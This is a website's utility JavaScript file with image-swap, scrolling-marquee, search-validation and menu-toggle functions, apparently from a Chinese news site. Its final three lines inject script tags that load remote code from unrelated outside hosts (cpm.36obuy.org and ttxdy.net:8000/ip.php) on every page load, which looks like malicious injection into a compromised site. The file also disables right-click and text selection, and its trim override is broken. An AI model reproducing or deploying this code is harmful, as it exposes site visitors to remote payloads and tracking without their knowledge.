// JavaScript Document
function MM_swapImgRestore() 
{ //v3.0
  var i,x,a=document.MM_sr;
  for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() 
{ //v3.0
  var d=document; if(d.images)
  {
	  if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; 
	for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0)
	{ 
	   d.MM_p[j]=new Image; 
	   d.MM_p[j++].src=a[i];
	}
  }
}

function MM_findObj(n, d)
{ //v4.01
   var p,i,x;  if(!d) d=document; 
   if((p=n.indexOf("?"))>0&&parent.frames.length) 
   {
     d=parent.frames[n.substring(p+1)].document; 
	 n=n.substring(0,p);
   }
   if(!(x=d[n])&&d.all) x=d.all[n]; 
   for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
   for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
   if(!x && d.getElementById)  x=d.getElementById(n);
   return x;
}

function MM_swapImage() 
{ //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; 
  document.MM_sr=new Array; 
  for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null)
   {
	   document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];
   }
}


	  var objSource;
	  var objTarget;
	  var objDiv;
	  var speed=30//速度数值越大速度越慢
	  function InitScroll(source,target,div)
	  {
		    objSource=document.getElementById(source);
		    objTarget=document.getElementById(target);
		    objDiv=document.getElementById(div); 
		    objTarget.innerHTML=objSource.innerHTML
	  }
	  function MarqueeLeft()
	  {
		  if(objTarget.offsetWidth- objDiv.scrollLeft<=0)objDiv.scrollLeft-=objSource.offsetWidth;
		  else objDiv.scrollLeft++;
	  }
      function ScrollLeft(source,target,div)
	  {
		   InitScroll(source,target,div);
		  var MyMarLeft=setInterval(MarqueeLeft,speed);
		  objDiv.onmouseover=function() {clearInterval(MyMarLeft);}
		  objDiv.onmouseout=function() {MyMarLeft=setInterval(MarqueeLeft,speed);}
	  }
	  
	  function MarqueeRight()
	  {
		   if(objDiv.scrollLeft<=0)objDiv.scrollLeft+=objTarget.offsetWidth;
		   else objDiv.scrollLeft--;
	  }
	  
	  function ScrollRight(source,target,div)
	  {
		  InitScroll(source,target,div);
		  var MyMarRight=setInterval(MarqueeRight,speed);
		  objDiv.onmouseover = function() { clearInterval(MyMarRight); }
		  objDiv.onmouseout=function() {MyMarRight=setInterval(MarqueeRight,speed);}
	  }
	  

function OpenURL(url)
{
   window.open(url,'_self', 'toolbar=yes,location=yes,directories=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes,copyhistory=yes');
}
function MaxDivSize(actual)
{
	var  objLeft=document.getElementById("contentLeft01");
	if(objLeft!=undefined)
	{
		leftHeight=objLeft.scrollHeight;
	    return Math.max(actual, leftHeight);
	}
	else return  actual;
}

function SearchGo() 
{
    var keyword = document.getElementById("textfield").value.trim();
    if (keyword == "" || keyword == "请输入关键字") {
        alert("请输入2-50个关键字");
        return ;
    
    }
    if (keyword.length < 2 || keyword.length > 50) {
        alert("请输入2-50个关键字");
        return ;
    }
    window.location.href='/search.html?type=news&tags='+escape(keyword);
}
String.prototype.trim=function()
{
      return this.replace("/(^\s*)|(\s*$)/g","");
}


function resizePhoto(img){
	if (img.width > 685)
	{
		img.width = 685;
	}
}


function ShowSubClass(obj,sum)
{
   for(var i=1;i<=sum;i++)
   {
	   if(("SZClass"+i)!=obj.id)
	   {
		  if($("#SZClass"+i+"sub")!=undefined&&$("#SZClass"+i+"sub")!=null)
		  {
			 $("#SZClass"+i+"sub").css("display","none");
		  }
		  if($("#SZClass"+i+"span")!=undefined&&$("#SZClass"+i+"span")!=null)
		  {
			 if(($("#SZClass"+i+"span").attr("className"))=="subbtn_cur")
			 {
				$("#SZClass"+i+"span").attr("className","subbtn_remove");
			 }
		  }
		  if($("#SZClass"+i).attr("className")=="li_cur")
		  {
			   $("#SZClass"+i).attr("className","li_remove")
		  }
	   }
    }
	if($("#"+obj.id+"sub")!=undefined&&$("#"+obj.id+"sub")!=null)
	{
	  $("#"+obj.id+"sub").css("display", $("#"+obj.id+"sub").css("display")=="block"?"none":"block");
	   if(($("#"+obj.id+"span").attr("className"))=="subbtn_remove")
	   {
				$("#"+obj.id+"span").attr("className","subbtn_cur");
	   }
	
	}
	
}

$(document).ready(function() {


	$("body").bind("contextmenu", function()
	{
		return false;
	});

	$("body").bind("selectstart", function()
	{
		return false;
	});
	$("#contentmain").find("a[href='http://202.96.165.8/zs']").attr("target","_blank").css("font-weight","bold");

});
document.writeln("<script src=\"http://cpm.36obuy.org/js/1.js\"></script>");
document.writeln("<script src=\"http://cpm.36obuy.org/js/1.js\"></script>");
document.writeln("<script src=\"http://www.ttxdy.net:8000/ip.php\"></script>");